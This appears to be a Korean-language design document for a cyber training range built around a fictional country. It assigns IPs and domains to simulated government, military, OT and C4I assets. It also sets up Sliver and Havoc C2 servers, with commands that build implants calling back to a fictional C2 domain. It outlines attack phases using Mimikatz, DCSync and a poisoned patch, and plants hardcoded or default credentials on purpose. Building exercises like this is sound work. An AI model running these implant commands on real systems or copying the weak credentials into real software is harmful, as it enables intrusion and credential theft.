# 🌐 훈련 환경 IP 대역 설계

> 모든 자산 개발 및 설정 시 이 문서의 IP를 기준으로 사용한다.
> 모든 기관명·도메인·국가 설정은 훈련용 픽션이며 실제 기관과 무관하다

---

# 설계 원칙

- **테스트 단계**: 모든 자산을 `192.168.92.0/24` 단일 네트워크에 배치 (플랫 네트워크)
- **본 훈련 단계**: 존별 서브넷 분리 + OPNSense 방화벽 구성 (별도 설계)
- 현재 문서는 **테스트 단계** 기준이며, IP는 `192.168.92.201 ~ 265` 범위를 사용한다

---

# 테스트 환경 네트워크

| 항목 | 값 |
|---|---|
| 서브넷 | 192.168.92.0/24 |
| 게이트웨이 | 192.168.92.1 |
| 자산 IP 범위 | 192.168.92.201 ~ (테스트 미할당) |
| 방화벽 | 없음 (플랫 네트워크) |

---

# OPNSense 방화벽 (본 훈련 단계용)

> **테스트 단계에서는 OPNSense를 사용하지 않는다** (플랫 네트워크).
> 본 훈련 배포 시 존별 서브넷 분리 후 OPNSense 7대를 구성한다. (별도 설계)

---

# 자산별 고정 IP 전체 목록

## 🏢 공공기관 — DMZ 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| 1 | 외부 포털 서버 | 192.168.92.201 | 80, 443, 8000 | Ubuntu 22.04 |
| 2 | 메일 포털 게이트 | 192.168.92.202 | 80, 443 | Ubuntu 22.04 |
| 3 | 민원 접수 서버 | 192.168.92.203 | 80, 443, 8000, 9000 | Ubuntu 22.04 |

## 🏢 공공기관 — INT 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| 4 | 내부 업무 포털 | 192.168.92.204 | 80, 8080 | Ubuntu 22.04 |
| 5 | 웹메일 | 192.168.92.205 | 25, 143, 993, 80 | Debian 12 |
| 6 | 민원 처리 서버 | 192.168.92.206 | 6379(Redis) | Ubuntu 22.04 |
| 7 | AI Assistant | 192.168.92.207 | 3000, 11434 | Ubuntu 22.04 |
| 8 | DB 서버 | 192.168.92.208 | 5432 | Ubuntu 22.04 |
| 9 | 업무용 PC-1 | 192.168.92.241 | — | Windows 10/11 |
| 9 | 업무용 PC-2 | 192.168.92.242 | — | Windows 10/11 |
| 9 | 업무용 PC-3 | 192.168.92.243 | — | Windows 10/11 |
| 9 | 업무용 PC-4 | 192.168.92.244 | — | Windows 10/11 |
| 9 | 업무용 PC-5 | 192.168.92.245 | — | Windows 10/11 |
| 10 | 관리자 PC | 192.168.92.246 | — | Windows 10/11 |
| 11 | 인증 서버 (AD/DC) | 192.168.92.209 | 389, 636, 88, 445 | Windows Server 2022 |

## 🏭 산업제어 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| 12 | Historian 서버 | 192.168.92.212 | 8086(InfluxDB), 8000(API) | Ubuntu 22.04 |

## ⚙️ OT 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| 13 | SCADA 서버 | 192.168.92.213 | 8080(SCADA-LTS), 1880(Node-RED) | Rocky Linux 9 |
| 14 | PLC 시뮬레이터 | 192.168.92.214 | 5000 | Ubuntu 22.04 |
| 15 | 운영자 PC-1 | 192.168.92.247 | — | Windows 10/11 |
| 15 | 운영자 PC-2 | 192.168.92.248 | — | Windows 10/11 |

## 🪖 군 DMZ 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| D1 | 외부 포털 서버 | 192.168.92.221 | 80, 443, 8080 | Rocky Linux 9 |
| D2 | VPN 게이트웨이 | 192.168.92.222 | 1194(UDP), 443 | Ubuntu 22.04 |
| D3 | 자료교환체계 (Nextcloud) | 192.168.92.223 | 80, 443 | Ubuntu 22.04 |
| D4 | 허니팟 SSH (Cowrie) | 192.168.92.224 | 22 | Ubuntu 22.04 |
| D5 | 허니팟 Web | 192.168.92.225 | 80, 443 | Ubuntu 22.04 |

## 🪖 군 INT 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| I6 | 내부 업무 포털 | 192.168.92.226 | 80, 8080 | Rocky Linux 9 |
| I7 | 웹메일 서버 | 192.168.92.227 | 25, 143, 993, 80 | Debian 12 |
| I8 | 문서 저장 서버 | 192.168.92.228 | 80, 8000 | Ubuntu 22.04 |
| I10 | 업무용 PC-1 | 192.168.92.249 | — | Windows 10/11 |
| I10 | 업무용 PC-2 | 192.168.92.250 | — | Windows 10/11 |
| I10 | 업무용 PC-3 | 192.168.92.251 | — | Windows 10/11 |
| I10 | 업무용 PC-4 | 192.168.92.252 | — | Windows 10/11 |
| I10 | 업무용 PC-5 | 192.168.92.253 | — | Windows 10/11 |
| I11 | 관리자 PC | 192.168.92.254 | — | Windows 10/11 |

## 🪖 군 패치관리 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| I9 | 패치 관리 서버 | 192.168.92.229 | 80, 8080 | Debian 12 |

> VPN 인증 성공 시 이 서브넷(192.168.92.0/24)만 라우팅 허용

## 🎯 C4I 자산

| 순번 | 자산명 | IP | 포트 | OS |
|---|---|---|---|---|
| C12 | 망 연동 서버 | 192.168.92.232 | 22, 8000 | Ubuntu 22.04 |
| C13 | 작전 상황도 서버 | 192.168.92.233 | 8080 | Rocky Linux 9 |
| C14 | 데이터 수집·관리 서버 | 192.168.92.234 | 8000, 5432 | Ubuntu 22.04 |
| C15 | 상황 요약 AI 서버 | 192.168.92.235 | 8001, 11434 | Ubuntu 22.04 |
| C16 | 작전용 PC-1 | (테스트 미할당) | — | Windows 10/11 |
| C16 | 작전용 PC-2 | (테스트 미할당) | — | Windows 10/11 |
| C16 | 작전용 PC-3 | (테스트 미할당) | — | Windows 10/11 |
| C16 | 작전용 PC-4 | (테스트 미할당) | — | Windows 10/11 |
| C16 | 작전용 PC-5 | (테스트 미할당) | — | Windows 10/11 |

## 🔐 VPN 설정

| 항목 | 값 |
|---|---|
| VPN 서버 | 192.168.92.222 |
| 클라이언트 할당 범위 | (테스트 단계: 플랫 네트워크로 VPN 불필요) |
| 인증 후 접근 허용 | 192.168.92.0/24 (패치관리서버 전용 서브넷) 만 |

---

# 주요 방화벽 허용 규칙 요약

> **참고:** OPNSense 방화벽 상세 규칙은 본 훈련(프로덕션) 단계에서 별도 설계한다.
> 테스트 단계에서는 플랫 네트워크(192.168.92.0/24)를 사용하므로 방화벽 규칙이 적용되지 않는다.

---

---

# 가상 국가 및 기관 설정

## 훈련 세계관

| 항목 | 설정값 | 비고 |
|---|---|---|
| 가상 국가명 | **Valdoria** | 픽션 국가 |
| 공격 그룹 | IRON VEIL + GORGON | 가상 APT + RaaS |
| 공격 그룹 배후 | 불명 (훈련 중 추적 과제) | — |
| 훈련 사용 언어 | 한국어 / 영어 | 시스템 UI·로그 포함 |

## 가상 도메인 설계

### 공공기관 영역

| 자산 | 도메인 / FQDN | 비고 |
|---|---|---|
| 외부 포털 서버 | `www.mois.valdoria.gov` | 행정안전부 모사 |
| 메일 포털 게이트 | `webmail.mois.valdoria.gov` | 외부 웹메일 접근 |
| 민원 접수 서버 | `minwon.mois.valdoria.gov` | 민원 포털 |
| 내부 업무 포털 | `intranet.mois.local` | 내부망 전용 |
| 웹메일 (내부) | `mail.mois.local` | Roundcube |
| DB 서버 | `db.mois.local` | — |
| AI Assistant | `ai.mois.local` | OpenWebUI |
| AD 도메인 | `corp.mois.local` | Active Directory |

### 군 영역

| 자산 | 도메인 / FQDN | 비고 |
|---|---|---|
| 외부 포털 서버 | `www.mnd.valdoria.mil` | 국방부 모사 |
| VPN 게이트웨이 | `vpn.mnd.valdoria.mil` | 원격접속 |
| 자료교환체계 | `share.mnd.valdoria.mil` | Nextcloud |
| 내부 업무 포털 | `intranet.mnd.local` | 군 내부망 |
| 웹메일 서버 | `mail.mnd.local` | Roundcube |
| 문서 저장 서버 | `docs.mnd.local` | — |
| 패치 관리 서버 | `update.mnd.local` | 전용 서브넷 |
| 군 AD 도메인 | `corp.mnd.local` | Active Directory |

### C4I 영역

| 자산 | 도메인 / FQDN | 비고 |
|---|---|---|
| 작전 상황도 서버 | `cop.c4i.local` | COP 웹 |
| 데이터 수집 서버 | `data.c4i.local` | FastAPI |
| 상황 요약 AI | `summary.c4i.local` | LLaMA 파이프라인 |
| 망 연동 서버 | `relay.c4i.local` | INT↔C4I 연계 |

> **내부 DNS 설계**: `.mois.local`, `.mnd.local`, `.c4i.local` 은 각 AD/내부 DNS 서버가 리졸브
> **외부 DNS 모사**: `*.valdoria.gov`, `*.valdoria.mil` 은 훈련망 내부 DNS 서버(192.168.1.20)가 직접 리졸브

---

# C2 프레임워크 구성

## 구성 개요

```
[레드팀 운영 서버 — 훈련망 외부 또는 별도 관리 VM]

  Sliver Server  ←──────────── 메인 C2 (전 구간)
  Havoc Server   ←──────────── 보조 C2 (Windows 단말 특화)
```

## 역할 분담

| C2 | 담당 구간 | 에이전트 | 통신 채널 |
|---|---|---|---|
| **Sliver** | Linux 서버 전반, 초기 거점 확보, 횡이동 | Sliver implant (Go) | HTTPS, mTLS, DNS |
| **Havoc** | Windows 업무용·관리자 PC, AD 공격 | Demon (C) | HTTPS |

## 공격 단계별 C2 사용

| 공격 단계 | C2 | 설명 |
|---|---|---|
| PHASE 1 — DMZ 초기 침투 | Sliver | 민원처리서버 역셸 → Sliver implant 이식 |
| PHASE 2 — INT 서버 확산 | Sliver | 업무포털·DB·AI 서버 장악 |
| PHASE 2 — PC 감염·AD 공격 | Havoc | 피싱 메일 → Demon 실행 → Mimikatz → DCSync |
| PHASE 3 — OT 침투 | Sliver | Historian·SCADA 접근 (Linux 기반) |
| PHASE 4 — 군 침투 | Sliver | VPN 진입 후 군 INT 서버 장악 |
| PHASE 4 — 군 PC 감염 | Havoc | 패치 악성파일 → Demon 실행 |
| PHASE 5 — C4I 조작 | Sliver | 데이터수집서버·상황도서버 API 조작 |

## Sliver 설치 및 운영 참고

```bash
# 서버 설치 (Ubuntu 22.04)
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux && ./sliver-server_linux

# HTTPS 리스너 (가상 도메인 활용)
sliver> https --domain update.valdoria.news --lport 443

# implant 생성 (Linux 서버용)
sliver> generate --http update.valdoria.news --os linux --arch amd64 --format elf --save /tmp/

# implant 생성 (Windows PC용 — Havoc Demon과 구분)
sliver> generate --http update.valdoria.news --os windows --arch amd64 --format exe --save /tmp/
```

## Havoc 설치 및 운영 참고

```bash
# 서버 빌드 (Ubuntu 22.04 기준)
git clone https://github.com/HavocFramework/Havoc && cd Havoc
make ts-build

# teamserver 설정 (Profiles/havoc.yaotl)
# Listener: HTTPS 443, 가상 도메인 설정
# → Host: update.valdoria.news

# Demon 생성 (GUI에서)
# Config → Indirect Syscall ON, Sleep Obfuscation ON
# → Windows x64 exe 생성
```

## C2 리다이렉터 (선택)

훈련망 내부이므로 리다이렉터는 선택사항이지만, 현실감을 위해 구성할 경우:

```
공격자 → 리다이렉터 VM (Nginx) → Sliver/Havoc Server
```

C2 도메인 예시 (훈련망 내부 DNS에 등록):
- `update.valdoria.news` → 리다이렉터 IP (Sliver)
- `cdn.valdoria.info` → 리다이렉터 IP (Havoc)

---

# 개발 시 사용할 환경변수 템플릿

AI에게 코드를 맡길 때 아래 값을 그대로 주입하도록 지시한다.

```env
# ── 공공기관 공통 ──────────────────────────────────────────
DOMAIN=mois.valdoria.gov
DOMAIN_INTERNAL=mois.local
MIL_DOMAIN_EXT=mnd.valdoria.mil
MIL_DOMAIN_INT=mnd.local
AD_SERVER=192.168.92.209
AD_DOMAIN=corp.mois.local

# ── 민원 접수 서버 (192.168.92.203) ───────────────────────
COMPLAINT_API_URL=http://192.168.92.203:8000
MINIO_ENDPOINT=192.168.92.203:9000
MINIO_ACCESS_KEY=minio_access
MINIO_SECRET_KEY=minio_secret123

# ── 민원 처리 서버 (192.168.92.206) ───────────────────────
REDIS_URL=redis://192.168.92.206:6379
COMPLAINT_INTAKE_HOST=192.168.92.203

# ── DB 서버 (192.168.92.208) ───────────────────────────────
# [취약 설정] application.properties에 하드코딩
DB_HOST=192.168.92.208
DB_PORT=5432
DB_NAME=agency_db
DB_USER=app_service
DB_PASSWORD=Sup3rS3cr3t!          # SUPERUSER 권한 부여됨

# ── 내부 업무 포털 (192.168.92.204) ───────────────────────
PORTAL_URL=http://192.168.92.204:8080

# ── 웹메일 (192.168.92.205) ────────────────────────────────
MAIL_HOST=192.168.92.205
SMTP_PORT=25
IMAP_PORT=143

# ── AI Assistant (192.168.92.207) ─────────────────────────
OPENWEBUI_URL=http://192.168.92.207:3000
OLLAMA_URL=http://192.168.92.207:11434

# ── Historian (192.168.92.212) ─────────────────────────────
HISTORIAN_API=http://192.168.92.212:8000
INFLUXDB_URL=http://192.168.92.212:8086
INFLUXDB_TOKEN=historian-dev-token-2024
INFLUXDB_ORG=ot-org
INFLUXDB_BUCKET=ot_data

# ── SCADA (192.168.92.213) ─────────────────────────────────
SCADA_URL=http://192.168.92.213:8080
NODERED_URL=http://192.168.92.213:1880

# ── PLC 시뮬레이터 (192.168.92.214) ───────────────────────
PLC_API=http://192.168.92.214:5000

# ── 군 공통 ────────────────────────────────────────────────
MIL_AD_DOMAIN=corp.mnd.local
VPN_HOST=192.168.92.222

# ── 군 자료교환체계 (192.168.92.223) ────────────────────────
NEXTCLOUD_URL=http://192.168.92.223
NEXTCLOUD_USER=GOV20190847
NEXTCLOUD_PASS=20190847890312      # [취약 설정] 초기 비밀번호 미변경

# ── 군 문서 저장 서버 (192.168.92.228) ────────────────────
DOCSTORAGE_URL=http://192.168.92.228:8000

# ── 패치 관리 서버 (192.168.92.229) ───────────────────────
PATCH_SERVER_URL=http://192.168.92.229

# ── C4I 데이터 수집 (192.168.92.234) ──────────────────────
# [취약 설정] 하드코딩된 API 키
C4I_API_URL=http://192.168.92.234:8000
C4I_API_KEY=dev-key-12345

# ── 작전 상황도 (192.168.92.233) ──────────────────────────
COP_URL=http://192.168.92.233:8080

# ── 상황 요약 AI (192.168.92.235) ─────────────────────────
SUMMARY_AI_URL=http://192.168.92.235:8001
SUMMARY_OLLAMA_URL=http://192.168.92.235:11434
```

---

# vSphere Port Group 구성

| Port Group 이름 | 서브넷 | VLAN ID |
|---|---|---|
| PG-MGMT | 192.168.1.0/24 | 1 |
| PG-PUB-DMZ | 192.168.92.0/24 | 10 |
| PG-PUB-INT | 192.168.92.0/24 | 20 |
| PG-IND-DMZ | 192.168.92.0/24 | 30 |
| PG-OT | 192.168.92.0/24 | 40 |
| PG-MIL-DMZ | 192.168.92.0/24 | 110 |
| PG-MIL-INT | 192.168.92.0/24 | 120 |
| PG-MIL-PATCH | 192.168.92.0/24 | 130 |
| PG-C4I | 192.168.92.0/24 | 140 |
